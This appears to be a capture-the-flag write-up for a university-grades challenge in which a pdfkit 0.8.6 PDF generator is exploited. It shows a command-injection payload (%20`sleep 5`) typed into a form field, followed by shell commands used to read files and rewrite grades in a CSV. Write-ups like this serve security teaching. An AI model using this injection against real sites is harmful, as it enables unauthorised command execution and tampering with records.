---
title: 'WHFD 2025 - grades'
shortTitle: 'grades'
date: 2025-04-11
length: 10 min
author: Colorman
headline: Read a solution to grades in Will Hack For Drinks 2025
---

> **3 - Grades**
>
> _Suggested difficulty: normal_
>
> The semester has come to a brutal end, and the results are in. You log in to
> the Intrusion Technics University (ITU) study management platform, My Study
> Activities to check your exam results. ITU is known for its unforgivingly high
> exam standards, and it seems your modest performance didn't make the cut.
>
> The means disappointed looks from friends and family, your future plans
> practically in shambles, and worst of all: the dreaded re-exam. But you're not
> ready to give up just yet! Setbacks are just opportunities in disguise, right?
> Somewhere in the depths of the university’s labyrinthine digital
> infrastructure, there has to be a way forward. You just need to find it.
>
> <https://grades.chall.itunderground.dk/static/index.html>

---

On the challenge we are greeted by a university grade platform. Going into
"examination results" we see a message indicating that we need to get a much
higher grade point average.

![examination result](/media/writeups/whfd25/grades/examination_results.png)

From the message we can assume that we are somehow meant to increase our GPA to
acceptable levels.

Exploring the site further, we find a page where you can print a PDF of your
examination results:

![printsite](/media/writeups/whfd25/grades/print1.png)

Most of the options in the dropdown don't work, but the one titled "BestÃ¥ede
resultater for igangvÃ¦rende uddannelser".

In addition to this, there's a text field for user input.

Clicking the CREATE PDF button generates a PDF file in the browser, with the
user input in the PDF. Interestingly, in the bottom of the PDF we see the text
"Created with love by pdfkit 0.8.6".

Googling "pdfkit 0.8.6 vulnerabilities" shows that this specific version of
pdfkit is vulnerable to command injection. In particular is a
[Snyk article](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) that
shows that using the string

```
%20`sleep 5`
```

causes the `sleep 5` command to get injected and ran by the program. And sure
enough, entering the above into the text field and clicking the button causes it
site to hang for 5 seconds!

We can push this further: the output of the command is visible in the PDF, so
using a command like `ls` we can see 2 files in the current directory:
`grades.csv` and `set_grade.sh`. Very suspicious. We can see using
`cat grades.csv` that it's a `csv` file that contains two columns, subject IDs
and grades:

```csv
subject,grade
BSHAXXX1KE,10
BSCTFWN1KE,7
BS4N5EC1KE,10
BSDBSQL1KE,10
BSR3V3R1KE,10
BSM4LW4R1KE,10
BS42PWN1KE,12
```

The `set_grade.sh` script seems useful. `cat`ing it we see that it takes a
subject ID and a grade, and seemingly modifies the CSV file somehow?

```sh
#!/bin/sh
# Function to print help information
usage() {
	echo "Sets the grade for a course"
	echo "ONLY FOR USE BY PROFESSORS"
	echo "Usage: $0 <ID> <NUMBER>"
	echo " <ID>: A course identifier"
	echo " <GRADE>: A grade"
	exit 1
}
# Check if exactly two arguments are provided
if [ "$#" -ne 2 ]; then
	usage
fi
ID="$1"
GRADE="$2"
grades_file="grades.csv"
found=0
awk -F, -v lookup="$ID" -v newval="$GRADE" -v found_ref="$found" 'BEGIN {OFS=","}
 $1 == lookup { $2 = newval; found_ref=1 }
 { print }
		END { if (found_ref == 0) exit 1 }' "$grades_file" >temp.csv
if [ $? -eq 1 ]; then
	echo "Error: Course '$ID' not found in '$grades_file'." >&2
	rm temp.csv
	exit 1
fi

echo "Grade for course '$ID' set to '$GRADE'."
mv temp.csv "$grades_file"
```

Let's try setting the grade of the first subject to 12, the highest grade in the
Danish education system:

```
> ./set_grade.sh BSHAXXX1KE 12
```

Once we've done this, we can already see the result in the PDF file! The subject
grade has been updated to 12!

![grade got upgraded](/media/writeups/whfd25/grades/resultup.png)

Let's do this to all the grades. After doing it, we go back to the results page
and we got the flag!

![flag](/media/writeups/whfd25/grades/flag.png)
